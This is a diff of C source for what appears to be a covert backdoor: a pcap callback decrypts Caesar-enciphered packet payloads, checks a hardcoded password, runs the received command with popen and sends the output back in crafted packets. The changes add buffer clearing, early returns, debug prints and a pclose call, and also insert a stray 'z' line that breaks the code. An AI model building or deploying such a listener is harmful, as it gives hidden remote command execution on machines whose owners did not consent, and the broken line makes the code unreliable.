@@ -82,7 +82,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	char password[strlen(PASSWORD) + 1];
 	char decrypted[PKT_SIZE];
 	char * command;
-
+z
 	ip = (struct ip_struct *)(packet + SIZE_ETHERNET);
 	size_ip = IP_HL(ip) * 4;
 
@@ -110,9 +110,11 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	/* define/compute tcp payload (segment) offset */
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
 
+	memset(decrypted, 0, sizeof(decrypted));
 	/* Decrypt the payload */
 	strcpy(decrypted, ConvertCaesar(mDecipher, (char *) payload, MOD, START));
-
+	
+	memset(password, 0, sizeof(password));
 	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
 	{
 		fprintf(stderr, "scanning error\n");
@@ -130,26 +132,27 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
 		send_command(command, ip, ntohs(tcp->th_sport));
+		printf("Sent\n");
 		free(command);
+		return;
 	}
 	else if (mode == CLIENT_MODE)
 	{
 		printf("%s\n", command);
 		free(command);
+		return;
 	}
 	else
 	{
 		fprintf(stderr, "Incorrect Password\n");
+		return;
 	}
-	memset(decrypted, 0, sizeof(decrypted));
-	memset(password, 0, sizeof(password));
-	return;
 
 }
 char * parse_cmd(char * data)
 {
 	char * start, * end;
-	char * command = malloc((PKT_SIZE) * sizeof(char));
+	char * command = malloc((PKT_SIZE + 1) * sizeof(char));
 
 	/* Point to the first occurance of pre-defined command string */
 	start = strstr(data, CMD_START);
@@ -177,16 +180,21 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 	char src[BUFFER];
 	char dst[BUFFER];
 
+	printf("Here1\n");
 	strcpy(src, inet_ntoa(ip->ip_dst));
 	strcpy(dst, inet_ntoa(ip->ip_src));
 
+	printf("Here2\n");
 	if((fp = popen(command, "r")) == NULL)
 	{
 		fprintf(stderr, "Cannot process command.\n");
 		return -1;
-	}	
+	}
+	printf("Here3\n");
+	
 	while(fgets(cmd_results, PKT_SIZE - 1, fp) != NULL)
 	{
+		printf("Getting\n");
 		//Format packet payload
 		sprintf(packet, "%s %d %s%s%s", PASSWORD, CLIENT_MODE, CMD_START, cmd_results, CMD_END);
 		printf("Packet: %s\n", packet);
@@ -200,5 +208,7 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
 	}
+	pclose(fp);
+	
 	return 0;
 }
